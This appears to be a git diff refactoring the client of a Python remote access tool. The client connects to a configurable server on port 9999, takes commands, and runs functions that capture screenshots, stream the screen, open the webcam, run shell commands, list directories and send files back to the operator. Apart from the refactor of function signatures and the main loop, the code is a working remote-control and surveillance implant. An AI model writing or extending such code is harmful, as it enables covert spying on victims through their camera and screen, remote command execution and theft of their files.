@@ -10,11 +10,7 @@ import cv2
 import numpy
 from PIL import ImageGrab
 
-#global variables
 
-sock = socket.socket()
-host = '127.0.0.1' #change this to the ip address of the server
-port = 9999
 
 def bind_socket():
     global host
@@ -39,18 +35,18 @@ def intract_with_shell(data,conn):
         conn.send(e.encode("utf-8"))
 
 # screen shot function to take screen shot 
-def take_screenshot(conn):
+def take_screenshot(data,conn):
     try:
         conn.send(('OK').encode("utf-8"))
         pic = pyautogui.screenshot()
         pic.save('myssdd.png')
-        fup('myssdd.png',conn)
+        send_file('myssdd.png',conn)
         os.unlink('myssdd.png')
     except Exception as e:
         conn.send(e.encode("utf-8"))
 
 # screen streaming function to stream the screen 
-def screen_streaming(conn): 
+def screen_streaming(data,conn):
     try:
         conn.send(('OK').encode("utf-8"))
         while True:
@@ -67,7 +63,7 @@ def screen_streaming(conn):
         conn.send(e.encode("utf-8"))
 
 # camera function to access the camera 
-def access_camera(conn):
+def access_camera(data,conn):
     try:
         conn.send(('OK').encode("utf-8"))
         cam = cv2.VideoCapture(0)
@@ -89,7 +85,7 @@ def access_camera(conn):
         conn.send(e.encode("utf-8"))
     
 # list files in the directory
-def list_files(conn):
+def list_files(data,conn):
     try:
         arr = pickle.dumps(os.listdir())
         conn.send(arr)
@@ -97,7 +93,7 @@ def list_files(conn):
         conn.send(('Error').encode("utf-8"))
 
 # change directory
-def change_directory(conn):
+def change_directory(data,conn):
     try:
         conn.send((os.getcwd()).encode("utf-8"))
         x=conn.recv(1024).decode("utf-8")
@@ -172,15 +168,20 @@ function_dict ={
     'sst': screen_streaming
 }
 
-#main
-bind_socket()
-while True:
-    data = (sock.recv(1024)).decode("utf-8").split('~')
-    if data[0] in function_dict:
-        function_dict[data[0]](data[1],sock)
-    elif data[0]=='cwd':
-        sock.send((os.getcwd()).encode("utf-8"))
-    elif data[0]=='exit':
-        break
-    else:
-        sock.send(".".encode('utf-8'))
+
+if __name__ == '__main__':
+    #global variables
+    sock = socket.socket()
+    host = '127.0.0.1' #change this to the ip address of the server
+    port = 9999
+    bind_socket()
+    while True:
+        data = (sock.recv(1024)).decode("utf-8").split('~')
+        if data[0] in function_dict:
+            function_dict[data[0]](data[1],sock)
+        elif data[0]=='cwd':
+            sock.send((os.getcwd()).encode("utf-8"))
+        elif data[0]=='exit':
+            break
+        else:
+            sock.send(".".encode('utf-8'))
